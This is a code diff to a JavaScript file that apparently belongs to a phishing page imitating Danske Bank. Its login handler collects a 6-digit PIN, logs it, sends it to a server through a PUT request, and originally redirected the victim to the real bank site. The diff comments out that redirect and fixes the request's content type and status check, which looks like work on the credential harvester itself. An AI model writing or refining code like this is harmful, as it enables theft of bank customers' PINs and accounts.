@@ -41,11 +41,11 @@ async function sendData(userData) {
             method: "PUT",
             body: JSON.stringify(userData),
             headers: {
-                "Content-type": "application/x-www-form-urlencoded",
+                "Content-type": "application/json",
             },
         });
         if (!response.ok) {
-            throw new Error(`Response loginStatus: ${response.loginStatus}`);
+            throw new Error(`Response status: ${response.status}`);
         }
 
         const result = await response.json();
@@ -125,7 +125,7 @@ loginBtn.addEventListener("click", (e) => {
             console.log("PIN-code collected");
             console.log(data, JSON.stringify(data));
             sendData(data);
-            location.href = "https://danskebank.dk";
+            // location.href = "https://danskebank.dk";
         } else {
             displayError("Forkert PIN-kode", "PIN-koder skal være 6 cifre, og kan kun have tal.");
 
